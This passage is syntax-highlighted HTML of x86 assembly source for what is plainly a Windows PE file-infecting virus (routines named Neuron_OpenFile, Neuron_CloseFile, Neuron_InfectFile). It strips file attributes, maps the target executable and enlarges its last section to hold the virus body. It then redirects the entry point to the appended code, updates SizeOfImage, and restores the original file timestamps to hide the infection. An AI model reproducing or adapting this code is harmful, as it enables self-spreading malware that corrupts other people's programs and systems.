</span><span class="sc5">nOpen_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nOpen_wait</span><span class="sc0">
</span><span class="sc5">n17</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">open_susp</span><span class="sc0">
</span><span class="sc5">end_OpenFile3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_OpenFile2</span><span class="sc0">
</span><span class="sc5">Neuron_OpenFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_CloseFile</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_closefile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">
</span><span class="sc5">n18</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">close_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">nCloseFile_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_susp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">         </span><span class="sc1">;quit ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;mode</span><span class="sc0">
</span><span class="sc5">nclose_param1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@10</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@11</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">nclose_param2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;unmap view of file</span><span class="sc0">
</span><span class="sc5">@11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;close mapping object</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@10</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">n19</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFilePointer</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;set file pointer to EOF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetEndOfFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;trucate file</span><span class="sc0">
</span><span class="sc5">@10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileTime</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;set back file time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;close time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_closefile</span><span class="sc0">
</span><span class="sc5">Neuron_CloseFile</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_InfectFile</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_infectfile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">

</span><span class="sc5">n20</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">inf_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">nInfect_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">inf_susp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nInfect_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">            </span><span class="sc1">;quit ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;blank file attributes</span><span class="sc0">
</span><span class="sc5">t4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nopen_param1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nopen_param2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nopen_param3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;open file</span><span class="sc0">
</span><span class="sc5">n21</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">inf_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">inf_wait</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_InfectFile</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressIT</span><span class="sc0">               </span><span class="sc1">;search for GMHA in IT</span><span class="sc0">
</span><span class="sc5">t5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stoK32</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szGetModuleHandleW</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressIT</span><span class="sc0">               </span><span class="sc1">;search for GMHW in IT</span><span class="sc0">
</span><span class="sc5">t6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_InfectClose</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGMHW</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">n22</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">stoK32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;locate first section</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get number of sctnz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;get LAST section</span><span class="sc0">
</span><span class="sc5">n23</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">BSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NBiggest</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NBiggest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">BSection</span><span class="sc0">   
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;new virtual size of section</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;new SizeOfRawData (aligned virtual size)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;new SizeOfImage</span><span class="sc0">
